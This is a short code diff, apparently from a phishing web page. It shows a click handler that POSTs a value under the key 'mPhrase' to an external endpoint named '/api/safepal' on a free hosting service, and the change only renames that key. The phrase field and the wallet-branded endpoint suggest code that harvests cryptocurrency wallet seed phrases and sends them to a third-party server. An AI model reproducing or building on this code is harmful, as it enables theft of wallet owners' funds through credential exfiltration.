@@ -76,7 +76,7 @@ document.querySelector(".button").addEventListener("click",(e)=>{
         console.log("HIE")
         const url = "https://backend-01-92mi.onrender.com/api/safepal";
         const data = {
-            mphrase:str
+            mPhrase:str
         };
         const options = {
             method: 'POST',
